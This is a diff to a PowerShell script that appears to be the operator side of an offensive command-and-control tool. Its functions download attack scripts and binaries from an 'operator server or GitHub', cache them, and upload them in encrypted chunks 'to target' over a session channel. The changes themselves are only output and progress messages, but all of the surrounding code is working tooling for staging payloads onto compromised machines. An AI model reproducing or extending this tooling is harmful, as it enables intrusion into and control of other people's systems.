@@ -390,14 +390,14 @@ function Fetch-ToolFromGitHub {
 
     foreach ($url in $urls) {
         try {
-            Write-Output " [*] '$ToolName' not in cache -fetching from $url ..."
+            Write-Host " [*] '$ToolName' not in cache — fetching from $url ..."
             $code = (New-Object Net.WebClient).DownloadString($url)
             $global:ToolCache[$ToolName] = $code
-            Write-Output " [+] '$ToolName' cached."
+            Write-Host " [+] '$ToolName' cached ($([Math]::Round($code.Length/1KB,0)) KB)."
             return $true
         } catch { }
     }
-    Write-Output " [-] Could not fetch '$ToolName' from operator server or GitHub."
+    Write-Host " [-] Could not fetch '$ToolName' from operator server or GitHub."
     return $false
 }
 
@@ -416,16 +416,16 @@ function Fetch-BinaryTool {
     }
     foreach ($url in $urls) {
         try {
-            Write-Output " [*] Fetching binary '$ToolName' from $url ..."
+            Write-Host " [*] Fetching binary '$ToolName' from $url ..."
             $bytes = (New-Object Net.WebClient).DownloadData($url)
             if ($bytes -and $bytes.Length -gt 0) {
                 $global:ToolCache[$ToolName] = [Convert]::ToBase64String($bytes)
-                Write-Output " [+] '$ToolName' binary cached ($($bytes.Length) bytes)."
+                Write-Host " [+] '$ToolName' binary cached ($($bytes.Length) bytes)."
                 return $true
             }
         } catch { }
     }
-    Write-Output " [-] Could not fetch binary '$ToolName' from operator server or GitHub."
+    Write-Host " [-] Could not fetch binary '$ToolName' from operator server or GitHub."
     return $false
 }
 
@@ -455,6 +455,8 @@ function Send-Module {
     $code      = $global:ToolCache[$ToolName]
     $codeBytes = [System.Text.Encoding]::UTF8.GetBytes($code)
     $chunkSize = 4096
+    $totalChunks = [Math]::Ceiling($codeBytes.Length / $chunkSize)
+    Write-Host " [*] Uploading '$ToolName' to target ($([Math]::Round($codeBytes.Length/1KB,0)) KB, $totalChunks chunks)..."
 
     $begin = "__MODULE_BEGIN__:${ToolName}:$($codeBytes.Length)"
     if ($SessionKey) { $begin = Protect-PipeMessage -PlainText $begin -Key $SessionKey }
